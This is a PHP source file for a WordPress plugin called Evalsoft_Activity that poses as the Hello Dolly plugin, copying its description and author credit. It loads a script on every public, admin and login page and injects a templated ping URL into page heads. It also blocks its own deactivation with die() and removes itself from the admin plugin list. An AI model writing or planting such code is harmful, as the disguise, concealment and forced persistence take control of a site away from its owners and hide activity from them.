<?php
/**
 * @package Evalsoft_Activity
 * @version 1.6
 */
/*
Plugin Name: Evalsoft_Activity
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.6
Author URI: http://ma.tt/
*/
if ( ! defined( 'ABSPATH' ) ) {
  exit; // Exit if accessed directly.
}


define('EVALSOFT_DEMO_PING_ALIVE_URL','{{{demo_ping_alive_url}}}');

//
// Add js script
//
// ********************************
function evalsoft_activity_script() {
  wp_enqueue_script(
    'evalsoft_activity',
    plugins_url('activity.js', __FILE__),
    ['jquery'],
    true
  );
}
add_action( 'wp_enqueue_scripts', 'evalsoft_activity_script' );
add_action( 'admin_enqueue_scripts', 'evalsoft_activity_script' );
add_action( 'login_enqueue_scripts', 'evalsoft_activity_script' );

function evalsoft_javascript_global_data() {
  echo '<script>window.EVALSOFT_DEMO_PING_ALIVE_URL = "'.EVALSOFT_DEMO_PING_ALIVE_URL.'";</script>';
}
add_action( 'wp_head', 'evalsoft_javascript_global_data' );
add_action( 'admin_head', 'evalsoft_javascript_global_data' );
add_action( 'login_head', 'evalsoft_javascript_global_data' );

//
// Do not allow to deactivate this plugin
//
// ********************************
register_deactivation_hook( __FILE__, 'evalsoft_deactivate_plugin' );
function evalsoft_deactivate_plugin() {
  die('You are not allowed to perform this operation!');
}

//
// Filter plugin list
//
// ********************************
function evalsoft_activity_hide_plugin() {
  global $wp_list_table;
  unset($wp_list_table->items['evalsoft_activity/evalsoft_activity.php']);
}
add_action('pre_current_active_plugins', 'evalsoft_activity_hide_plugin');
